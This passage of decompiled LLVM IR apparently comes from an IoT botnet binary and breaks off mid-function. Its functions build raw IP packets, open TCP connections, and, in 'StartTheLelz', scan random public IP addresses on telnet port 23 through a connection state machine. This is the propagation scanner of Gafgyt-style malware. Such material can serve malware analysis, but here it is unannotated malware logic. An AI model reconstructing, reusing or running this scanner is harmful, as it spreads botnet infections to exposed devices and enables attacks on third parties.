  %v3_ca30 = load i32, i32* %v2_ca30, align 4
  store i32 %v3_ca30, i32* %stack_var_-44, align 4
  %v1_ca58 = call i32 @__GI_htons(i32 20)
  %v1_ca74 = call i32 @malloc(i32 32)
  %v2_ca80 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_ca80, i32* @r3, align 4
  store i32 %v1_ca74, i32* @r0, align 4
  store i32 %v2_ca80, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ca90 = call i32 @memcpy()
  %v1_ca98 = add i32 %v1_ca74, 12
  store i32 %v1_ca98, i32* @r3, align 4
  store i32 %v1_ca98, i32* @r0, align 4
  %v3_caa0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_caa0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_caa8 = call i32 @memcpy()
  %v2_cab4 = inttoptr i32 %v1_ca74 to i16*
  %v3_cab4 = call i32 @csum(i16* %v2_cab4, i32 32)
  %sext = mul i32 %v3_cab4, 65536
  %v1_cab8 = sdiv i32 %sext, 65536
  store i32 %v1_ca74, i32* @r0, align 4
  %v0_cac4 = call i32 @free()
  %v4_cac8 = urem i32 %v1_cab8, 65536
  store i32 %v3_ca0c, i32* @fp, align 4
  ret i32 %v4_cac8

; uselistorder directives
  uselistorder i32 %v1_ca74, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_cae0 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_cb4c = add i32 %tmp3, 1
  %v4_cb4c = inttoptr i32 %v3_cb4c to i8*
  store i8 0, i8* %v4_cb4c, align 1
  %v3_cb50 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cb50, 20
  %v1_cb6c = trunc i32 %fold to i16
  %v3_cb6c = add i32 %tmp3, 2
  %v4_cb6c = inttoptr i32 %v3_cb6c to i16*
  store i16 %v1_cb6c, i16* %v4_cb6c, align 2
  %v0_cb70 = call i32 @rand_cmwc()
  %v1_cb84 = trunc i32 %v0_cb70 to i16
  %v3_cb84 = add i32 %tmp3, 4
  %v4_cb84 = inttoptr i32 %v3_cb84 to i16*
  store i16 %v1_cb84, i16* %v4_cb84, align 2
  %v3_cb90 = add i32 %tmp3, 6
  %v4_cb90 = inttoptr i32 %v3_cb90 to i16*
  store i16 0, i16* %v4_cb90, align 2
  %v3_cb9c = add i32 %tmp3, 8
  %v4_cb9c = inttoptr i32 %v3_cb9c to i8*
  store i8 -1, i8* %v4_cb9c, align 1
  %v3_cba8 = add i32 %tmp3, 9
  %v4_cba8 = inttoptr i32 %v3_cba8 to i8*
  store i8 %tmp, i8* %v4_cba8, align 1
  %v3_cbb4 = add i32 %tmp3, 10
  %v4_cbb4 = inttoptr i32 %v3_cbb4 to i16*
  store i16 0, i16* %v4_cbb4, align 2
  %v2_cbc0 = add i32 %tmp3, 12
  %v3_cbc0 = inttoptr i32 %v2_cbc0 to i32*
  store i32 %arg3, i32* %v3_cbc0, align 4
  %v2_cbcc = add i32 %tmp3, 16
  %v3_cbcc = inttoptr i32 %v2_cbcc to i32*
  store i32 %arg2, i32* %v3_cbcc, align 4
  store i32 %v3_cae0, i32* @fp, align 4
  ret i32 %v0_cb70

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 0, 4 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_cbf8 = icmp sgt i32 %arg1, 2
  br i1 %v8_cbf8, label %dec_label_pc_cc08, label %dec_label_pc_cc18

dec_label_pc_cc08:                                ; preds = %entry
  %v1_cc0c = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_cc18

dec_label_pc_cc18:                                ; preds = %entry, %dec_label_pc_cc08
  %storemerge1 = phi i32 [ 0, %dec_label_pc_cc08 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_cc18, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_cc30 = load i32, i32* @fp, align 4
  store i32 52280, i32* %stack_var_-4, align 4
  %v2_cc34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cc34, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_cc54 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_cc64 = icmp eq i32 %v1_cc54, 0
  br i1 %v2_cc64, label %dec_label_pc_cc6c, label %dec_label_pc_cc78

dec_label_pc_cc6c:                                ; preds = %entry
  br label %dec_label_pc_cd44

dec_label_pc_cc78:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_cc7c = add i32 %v1_cc54, 16
  %v2_cc7c = inttoptr i32 %v1_cc7c to i32*
  %v3_cc7c = load i32, i32* %v2_cc7c, align 4
  %v1_cc80 = inttoptr i32 %v3_cc7c to i32*
  %v2_cc80 = load i32, i32* %v1_cc80, align 4
  %v1_cc88 = add i32 %v1_cc54, 12
  %v2_cc88 = inttoptr i32 %v1_cc88 to i32*
  %v3_cc88 = load i32, i32* %v2_cc88, align 4
  store i32 %v3_cc88, i32* @r2, align 4
  %v2_cc94 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_cc94, i32* @r3, align 4
  %v5_cca0 = call i32 @bcopy(i32 %v2_cc80, i32 %v2_cc94, i32 %v3_cc88, i32 %v2_cc94, i32 %v1_cc54)
  %v2_ccac = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_cccc = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_ccd8 = ptrtoint i32* %stack_var_-44 to i32
  %v5_ccf4 = call i32 @__GI_setsockopt(i32 %v3_cccc, i32 6, i32 1, i32 %v2_ccd8, i32 4)
  %v3_ccfc = icmp eq i32 %v3_cccc, -1
  br i1 %v3_ccfc, label %dec_label_pc_cd04, label %dec_label_pc_cd10

dec_label_pc_cd04:                                ; preds = %dec_label_pc_cc78
  br label %dec_label_pc_cd44

dec_label_pc_cd10:                                ; preds = %dec_label_pc_cc78
  %v2_cc90 = ptrtoint i32* %stack_var_-40 to i32
  %v3_cd20 = call i32 @__libc_connect(i32 %v3_cccc, i32 %v2_cc90, i32 16)
  %v3_cd28 = icmp eq i32 %v3_cd20, -1
  br i1 %v3_cd28, label %dec_label_pc_cd30, label %dec_label_pc_cd3c

dec_label_pc_cd30:                                ; preds = %dec_label_pc_cd10
  br label %dec_label_pc_cd44

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd10
  br label %dec_label_pc_cd44

dec_label_pc_cd44:                                ; preds = %dec_label_pc_cd30, %dec_label_pc_cd04, %dec_label_pc_cc6c, %dec_label_pc_cd3c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cc6c ], [ 0, %dec_label_pc_cd04 ], [ 0, %dec_label_pc_cd30 ], [ %v3_cccc, %dec_label_pc_cd3c ]
  store i32 %v3_cc30, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_cd44, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_cd58 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_cd58, i32* %ip.global-to-local, align 4
  %v3_cd5c = load i32, i32* @r4, align 4
  store i32 %v3_cd5c, i32* %stack_var_-24, align 4
  store i32 52580, i32* %stack_var_-4, align 4
  %v19_cd5c = ptrtoint i32* %stack_var_-24 to i32
  %v2_cd60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cd60, i32* @fp, align 4
  %v2_cd7c = call i32 @__GI_time(i32* null)
  store i32 %v2_cd7c, i32* @r4, align 4
  %v0_cd88 = call i32 @rand_cmwc()
  %v0_cd90 = load i32, i32* @r4, align 4
  %v2_cd90 = xor i32 %v0_cd90, %v0_cd88
  %v1_cd98 = call i32 @srand(i32 %v2_cd90)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_cdb4 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_cde4 = bitcast i32* %stack_var_-604 to i8*
  %v3_cde4 = call i32 @__GI_memset(i8* %v2_cde4, i32 0)
  %v1_cdf0 = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_ce0c = inttoptr i32 %v1_cdf0 to i8*
  %v3_ce0c = call i32 @__GI_memset(i8* %v2_ce0c, i32 0)
  %v2_ce1c = mul i32 %arg2, 28
  %v1_ce24 = add i32 %v2_ce1c, 14
  %v3_ce28 = and i32 %v1_ce24, -8
  %v1_ce30 = load i32, i32* @sp, align 4
  %v2_ce30 = sub i32 %v1_ce30, %v3_ce28
  %v1_ce40 = add i32 %v2_ce30, 15
  %v3_ce44 = and i32 %v1_ce40, -8
  %v2_ce68 = mul i32 %arg2, 5
  store i32 %v2_ce68, i32* @r2, align 4
  %v2_ce78 = inttoptr i32 %v3_ce44 to i8*
  %v3_ce78 = call i32 @__GI_memset(i8* %v2_ce78, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_cf1856 = icmp sgt i32 %arg2, 0
  br i1 %v5_cf1856, label %dec_label_pc_ce88, label %dec_label_pc_cf1c

dec_label_pc_ce88:                                ; preds = %entry, %dec_label_pc_ce88
  %storemerge457 = phi i32 [ %v1_cf04, %dec_label_pc_ce88 ], [ 0, %entry ]
  %v2_ce98 = mul i32 %storemerge457, 28
  %v2_ce9c = add i32 %v2_ce98, %v3_ce44
  store i32 28, i32* @r2, align 4
  %v2_ceac = inttoptr i32 %v2_ce9c to i8*
  %v3_ceac = call i32 @__GI_memset(i8* %v2_ceac, i32 0)
  %v3_ced4 = add i32 %v2_ce9c, 9
  %v4_ced4 = inttoptr i32 %v3_ced4 to i8*
  store i8 1, i8* %v4_ced4, align 1
  %v2_cef4 = add i32 %v2_ce9c, 24
  %v2_cefc = inttoptr i32 %v2_cef4 to i32*
  store i32 %v1_cdf0, i32* %v2_cefc, align 4
  %v1_cf04 = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_cf04, i32* %r2.global-to-local, align 4
  %v5_cf18 = icmp slt i32 %v1_cf04, %arg2
  br i1 %v5_cf18, label %dec_label_pc_ce88, label %dec_label_pc_cf1c

dec_label_pc_cf1c:                                ; preds = %dec_label_pc_ce88, %entry
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %dec_label_pc_cf24, %dec_label_pc_cf1c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cf1c ], [ %v1_cf28, %dec_label_pc_cf24 ]
  %v1_cf28 = add i32 %stack_var_-56.0, 1
  store i32 %v1_cf28, i32* %r2.global-to-local, align 4
  %v4_cf38 = mul i32 %v1_cf28, 4
  %v5_cf38 = add i32 %v4_cf38, ptrtoint ([10 x i8*]* @global_var_28210.326 to i32)
  %v6_cf38 = inttoptr i32 %v5_cf38 to i32*
  %v7_cf38 = load i32, i32* %v6_cf38, align 4
  %v2_cf3c = icmp eq i32 %v7_cf38, 0
  br i1 %v2_cf3c, label %dec_label_pc_cf44.preheader, label %dec_label_pc_cf24

dec_label_pc_cf44.preheader:                      ; preds = %dec_label_pc_cf24
  %v2_cfcc = add i32 %v3_ce44, 8
  %v2_d2cc = or i32 %v3_ce44, 4
  %v2_d3ac = ptrtoint i32* %stack_var_-612 to i32
  %v2_d42c = ptrtoint i32* %stack_var_-324 to i32
  %v2_d528 = ptrtoint i32* %stack_var_-332 to i32
  %v2_d584 = ptrtoint i32* %stack_var_-340 to i32
  %v2_d588 = ptrtoint i32* %stack_var_-336 to i32
  %v2_d6a4 = add i32 %v3_ce44, 16
  %v2_d720 = add i32 %v3_ce44, 24
  br label %dec_label_pc_cf44

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf44, %dec_label_pc_e0a0, %dec_label_pc_cf44.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_cf1856, label %dec_label_pc_cf50, label %dec_label_pc_cf44

dec_label_pc_cf50:                                ; preds = %dec_label_pc_cf44, %dec_label_pc_e0a0
  %storemerge548 = phi i32 [ %v1_e0a4, %dec_label_pc_e0a0 ], [ 0, %dec_label_pc_cf44 ]
  %v3_cf5c = mul i32 %storemerge548, 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_cf64 = mul i32 %storemerge548, 28
  %v2_cf68 = add i32 %v2_cf64, %v3_ce44
  %v2_cf6c = add i32 %v2_cf68, 16
  %v1_cf70 = inttoptr i32 %v2_cf6c to i32*
  %v2_cf70 = load i32, i32* %v1_cf70, align 4
  %v2_cf74 = icmp eq i32 %v2_cf70, 0
  br i1 %v2_cf74, label %dec_label_pc_cf7c, label %dec_label_pc_cfb4

dec_label_pc_cf7c:                                ; preds = %dec_label_pc_cf50
  store i32 %storemerge548, i32* @r4, align 4
  %v2_cf84 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_cf98 = load i32, i32* @r4, align 4
  %v3_cf9c = mul i32 %v0_cf98, 4
  store i32 %v3_cf9c, i32* %r2.global-to-local, align 4
  %v2_cfa4 = mul i32 %v0_cf98, 28
  %v2_cfac = add i32 %v2_d6a4, %v2_cfa4
  %v2_cfb0 = inttoptr i32 %v2_cfac to i32*
  store i32 %v2_cf84, i32* %v2_cfb0, align 4
  br label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_cf50, %dec_label_pc_cf7c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_cfd0 = add i32 %v2_cfcc, %v2_cf64
  %v1_cfd4 = inttoptr i32 %v2_cfd0 to i8*
  %v2_cfd4 = load i8, i8* %v1_cfd4, align 4
  %v3_cfd4 = sext i8 %v2_cfd4 to i32
  switch i32 %v3_cfd4, label %dec_label_pc_e0a0 [
    i32 0, label %dec_label_pc_d004
    i32 1, label %dec_label_pc_d440.lr.ph
    i32 2, label %dec_label_pc_d6ec
    i32 3, label %dec_label_pc_d838
    i32 4, label %dec_label_pc_d98c
    i32 5, label %dec_label_pc_dad8
    i32 6, label %dec_label_pc_dc2c
    i32 7, label %dec_label_pc_df30
  ]

dec_label_pc_d004:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d020 = add i32 %v2_cf68, 8
  %v1_d024 = add i32 %v2_cf68, 9
  %v2_d024 = inttoptr i32 %v1_d024 to i8*
  %v3_d024 = load i8, i8* %v2_d024, align 1
  %v7_d028 = icmp eq i8 %v3_d024, 1
  br i1 %v7_d028, label %dec_label_pc_d030, label %dec_label_pc_d0dc

dec_label_pc_d030:                                ; preds = %dec_label_pc_d004
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d04c = add i32 %v2_cf68, 24
  %v1_d050 = inttoptr i32 %v2_d04c to i32*
  %v2_d050 = load i32, i32* %v1_d050, align 4
  store i32 28, i32* @r2, align 4
  %v2_d07c = inttoptr i32 %v2_cf68 to i8*
  %v3_d07c = call i32 @__GI_memset(i8* %v2_d07c, i32 0)
  store i32 %v2_d04c, i32* %r2.global-to-local, align 4
  store i32 %v2_d050, i32* %v1_d050, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_d0ac = call i32 @GetRandomPublicIP(i32 24, i32 %v3_ce44, i32 %v2_d04c, i32 %v2_d050)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d0bc = load i32, i32* @r4, align 4
  %v3_d0c0 = mul i32 %v0_d0bc, 4
  store i32 %v3_d0c0, i32* %r2.global-to-local, align 4
  %v2_d0c8 = mul i32 %v0_d0bc, 28
  %v2_d0d0 = add i32 %v2_d2cc, %v2_d0c8
  %v2_d0d4 = inttoptr i32 %v2_d0d0 to i32*
  store i32 %v4_d0ac, i32* %v2_d0d4, align 4
  br label %dec_label_pc_d268

dec_label_pc_d0dc:                                ; preds = %dec_label_pc_d004
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d0fc = load i8, i8* %v2_d024, align 1
  %v2_d100 = icmp eq i8 %v3_d0fc, 0
  br i1 %v2_d100, label %dec_label_pc_d108, label %dec_label_pc_d268

dec_label_pc_d108:                                ; preds = %dec_label_pc_d0dc
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d12c = add i32 %v2_cf68, 11
  %v2_d12c = inttoptr i32 %v1_d12c to i8*
  %v3_d12c = load i8, i8* %v2_d12c, align 1
  %v1_d130 = add i8 %v3_d12c, 1
  store i8 %v1_d130, i8* %v2_d12c, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d184 = add i32 %v2_cf68, 10
  %v2_d184 = inttoptr i32 %v1_d184 to i8*
  %v3_d184 = load i8, i8* %v2_d184, align 2
  %v1_d188 = add i8 %v3_d184, 1
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_d188, i8* %v2_d184, align 2
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d1d8 = load i8, i8* %v2_d12c, align 1
  %v7_d1dc = icmp eq i8 %v3_d1d8, 3
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v7_d1dc, label %dec_label_pc_d1e4, label %dec_label_pc_d210

dec_label_pc_d1e4:                                ; preds = %dec_label_pc_d108
  store i32 %v2_d020, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_d024, align 1
  br label %dec_label_pc_e0a0

dec_label_pc_d210:                                ; preds = %dec_label_pc_d108
  %v3_d230 = load i8, i8* %v2_d184, align 2
  %v7_d234 = icmp eq i8 %v3_d230, 3
  br i1 %v7_d234, label %dec_label_pc_d23c, label %dec_label_pc_d268

dec_label_pc_d23c:                                ; preds = %dec_label_pc_d210
  store i32 %v2_d020, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_d024, align 1
  br label %dec_label_pc_e0a0

dec_label_pc_d268:                                ; preds = %dec_label_pc_d210, %dec_label_pc_d0dc, %dec_label_pc_d030
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_d280 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_d2b0 = call i32 @__GI_memset(i8* %v2_cde4, i32 0)
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d2ec = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_d2f4 = load i32, i32* @r4, align 4
  %v2_d300 = mul i32 %v0_d2f4, 28
  %v2_d304 = add i32 %v2_d300, %v3_ce44
  %v2_d308 = inttoptr i32 %v2_d304 to i32*
  store i32 %v3_d2ec, i32* %v2_d308, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d324 = inttoptr i32 %v2_cf68 to i32*
  %v2_d324 = load i32, i32* %v1_d324, align 4
  %v7_d328 = icmp eq i32 %v2_d324, -1
  br i1 %v7_d328, label %dec_label_pc_e0a0, label %dec_label_pc_d330

dec_label_pc_d330:                                ; preds = %dec_label_pc_d268
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d348 = load i32, i32* %v1_d324, align 4
  store i32 %v2_d348, i32* @r4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d364 = load i32, i32* %v1_d324, align 4
  store i32 %v2_d364, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d374 = call i32 @__libc_fcntl(i32 %v2_d364, i32 3)
  %v1_d37c = or i32 %v2_d374, 2048
  store i32 %v1_d37c, i32* @r3, align 4
  %v0_d380 = load i32, i32* @r4, align 4
  store i32 %v1_d37c, i32* %r2.global-to-local, align 4
  %v2_d38c = call i32 @__libc_fcntl(i32 %v0_d380, i32 4)
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d3a8 = load i32, i32* %v1_d324, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d3bc = call i32 @__libc_connect(i32 %v2_d3a8, i32 %v2_d3ac, i32 16)
  %v3_d3c4 = icmp eq i32 %v3_d3bc, -1
  br i1 %v3_d3c4, label %dec_label_pc_d3cc, label %dec_label_pc_d404

dec_label_pc_d3cc:                                ; preds = %dec_label_pc_d330
  %v0_d3cc = call i32 @__GI___errno_location()
  %v1_d3d4 = inttoptr i32 %v0_d3cc to i32*
  %v2_d3d4 = load i32, i32* %v1_d3d4, align 4
  %v7_d3d8 = icmp eq i32 %v2_d3d4, 115
  br i1 %v7_d3d8, label %dec_label_pc_d404, label %dec_label_pc_d3e0

dec_label_pc_d3e0:                                ; preds = %dec_label_pc_d3cc
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d3fc = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d404:                                ; preds = %dec_label_pc_d330, %dec_label_pc_d3cc
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d424 = call i32 @advance_state(i32* nonnull %v1_d324, i32 1)
  br label %dec_label_pc_e0a0

dec_label_pc_d440.lr.ph:                          ; preds = %dec_label_pc_cfb4
  br label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d440.lr.ph, %dec_label_pc_d440
  %storemerge610 = phi i32 [ 0, %dec_label_pc_d440.lr.ph ], [ %v1_d454, %dec_label_pc_d440 ]
  store i32 %v2_d42c, i32* %r2.global-to-local, align 4
  %v5_d44c = mul nuw nsw i32 %storemerge610, 4
  %v6_d44c = add i32 %v5_d44c, %v2_d42c
  %v7_d44c = inttoptr i32 %v6_d44c to i32*
  store i32 0, i32* %v7_d44c, align 4
  %v1_d454 = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_d454, 32
  br i1 %tmp39, label %dec_label_pc_d440, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d440
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d480 = inttoptr i32 %v2_cf68 to i32*
  %v2_d480 = load i32, i32* %v1_d480, align 4
  %v3_d484 = udiv i32 %v2_d480, 32
  %v3_d498 = mul nuw nsw i32 %v3_d484, 4
  %v2_d4a0 = add i32 %v3_d498, %v19_cd5c
  store i32 %v2_d4a0, i32* %r2.global-to-local, align 4
  %v2_d4a4 = add i32 %v2_d4a0, -300
  %v1_d4a8 = inttoptr i32 %v2_d4a4 to i32*
  %v2_d4a8 = load i32, i32* %v1_d4a8, align 4
  store i32 %v2_d4a8, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d4c4 = load i32, i32* %v1_d480, align 4
  %v1_d4c8 = urem i32 %v2_d4c4, 32
  %v6_d4d0 = shl i32 1, %v1_d4c8
  %v2_d4d4 = or i32 %v6_d4d0, %v2_d4a8
  store i32 %v2_d4d4, i32* %v1_d4a8, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d51c = load i32, i32* %v1_d480, align 4
  %v1_d520 = add i32 %v2_d51c, 1
  store i32 %v1_d520, i32* %r2.global-to-local, align 4
  store i32 %v2_d42c, i32* %ip.global-to-local, align 4
  %v1_d52c = load i32, i32* @sp, align 4
  %v2_d52c = inttoptr i32 %v1_d52c to i32*
  store i32 %v2_d528, i32* %v2_d52c, align 4
  %v0_d530 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_d42c, i32* %r2.global-to-local, align 4
  %v4_d540 = load i32, i32* %stack_var_-332, align 4
  %v5_d540 = call i32 @__libc_select(i32 %v0_d530, i32 0, i32 %v2_d42c, i32 0, i32 %v4_d540)
  %v7_d550 = icmp eq i32 %v5_d540, 1
  br i1 %v7_d550, label %dec_label_pc_d558, label %dec_label_pc_d65c

dec_label_pc_d558:                                ; preds = %dec_label_pc_d468
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d580 = load i32, i32* %v1_d480, align 4
  store i32 %v2_d580, i32* %r2.global-to-local, align 4
  store i32 %v2_d584, i32* %ip.global-to-local, align 4
  %v1_d58c = load i32, i32* @sp, align 4
  %v2_d58c = inttoptr i32 %v1_d58c to i32*
  store i32 %v2_d588, i32* %v2_d58c, align 4
  %v0_d590 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d5a0 = load i32, i32* %stack_var_-340, align 4
  %v5_d5a0 = call i32 @getsockopt(i32 %v0_d590, i32 1, i32 4, i32 %v2_d584, i32 %v4_d5a0)
  %v3_d5a4 = load i32, i32* %stack_var_-340, align 4
  %v2_d5a8 = icmp eq i32 %v3_d5a4, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v2_d5a8, label %dec_label_pc_d5d4, label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d558
  %v3_d5cc = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d5d4:                                ; preds = %dec_label_pc_d558
  %v2_d5ec = load i32, i32* %v1_d480, align 4
  store i32 %v2_d5ec, i32* @r4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d608 = load i32, i32* %v1_d480, align 4
  store i32 %v2_d608, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d618 = call i32 @__libc_fcntl(i32 %v2_d608, i32 3)
  %v1_d620 = and i32 %v2_d618, -2049
  store i32 %v1_d620, i32* @r3, align 4
  %v0_d624 = load i32, i32* @r4, align 4
  store i32 %v1_d620, i32* %r2.global-to-local, align 4
  %v2_d630 = call i32 @__libc_fcntl(i32 %v0_d624, i32 4)
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d654 = call i32 @advance_state(i32* nonnull %v1_d480, i32 2)
  br label %dec_label_pc_e0a0

dec_label_pc_d65c:                                ; preds = %dec_label_pc_d468
  %v3_d660 = icmp eq i32 %v5_d540, -1
  br i1 %v3_d660, label %dec_label_pc_d668, label %dec_label_pc_d68c

dec_label_pc_d668:                                ; preds = %dec_label_pc_d65c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d684 = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d65c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d6a8 = add i32 %v2_cf64, %v2_d6a4
  %v1_d6ac = inttoptr i32 %v2_d6a8 to i32*
  %v2_d6ac = load i32, i32* %v1_d6ac, align 4
  %v1_d6b0 = add i32 %v2_d6ac, 5
  store i32 %v1_d6b0, i32* @r4, align 4
  %v2_d6b8 = call i32 @__GI_time(i32* null)
  %v0_d6c0 = load i32, i32* @r4, align 4
  %v3_d6c0 = icmp ult i32 %v0_d6c0, %v2_d6b8
  br i1 %v3_d6c0, label %dec_label_pc_d6c8, label %dec_label_pc_e0a0

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d68c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d6e4 = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d704 = inttoptr i32 %v2_cf68 to i32*
  %v2_d704 = load i32, i32* %v1_d704, align 4
  store i32 %v2_d704, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d724 = add i32 %v2_cf64, %v2_d720
  %v1_d728 = inttoptr i32 %v2_d724 to i32*
  %v2_d728 = load i32, i32* %v1_d728, align 4
  store i32 %v2_d728, i32* %r2.global-to-local, align 4
  %v1_d730 = load i32, i32* @sp, align 4
  %v2_d730 = inttoptr i32 %v1_d730 to i32*
  store i32 ptrtoint (i32* @global_var_2823c to i32), i32* %v2_d730, align 4
